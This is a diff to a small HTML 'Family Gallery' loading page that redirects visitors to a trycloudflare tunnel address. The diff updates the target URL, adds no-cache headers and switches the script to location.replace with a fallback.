@@ -2,8 +2,10 @@
 <html>
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate, max-age=0">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
     <title>Family Gallery</title>
-    <meta http-equiv="refresh" content="0; url=https://stamp-architects-possession-track.trycloudflare.com">
     <style>
         body {
             background: #0a0a0a;
@@ -16,16 +18,27 @@
             margin: 0;
             flex-direction: column;
         }
-        a { color: #6366f1; text-decoration: none; }
-        h2 { margin-bottom: 8px; }
-        p { color: #888; font-size: 14px; }
+        a { color: #6366f1; text-decoration: none; padding: 12px 24px; 
+             background: #1e1e1e; border-radius: 8px; margin-top: 12px; }
     </style>
 </head>
 <body>
     <h2>📸 Loading Family Gallery...</h2>
-    <p>If not redirected, <a href="https://stamp-architects-possession-track.trycloudflare.com">click here</a></p>
+    <p id="status">Please wait...</p>
+    <a href="https://conferencing-tapes-years-warming.trycloudflare.com" id="link">Click here if not redirected</a>
+    <p style="font-size:10px;color:#555;margin-top:20px">Build: 1784135203</p>
     <script>
-        window.location.href = "https://stamp-architects-possession-track.trycloudflare.com";
+        // Redirect immediately with cache buster
+        (function() {
+            var url = "https://conferencing-tapes-years-warming.trycloudflare.com";
+            // Try replace first (doesn't add to history)
+            try {
+                window.location.replace(url);
+            } catch(e) {
+                // Fallback to href
+                window.location.href = url;
+            }
+        })();
     </script>
 </body>
 </html>
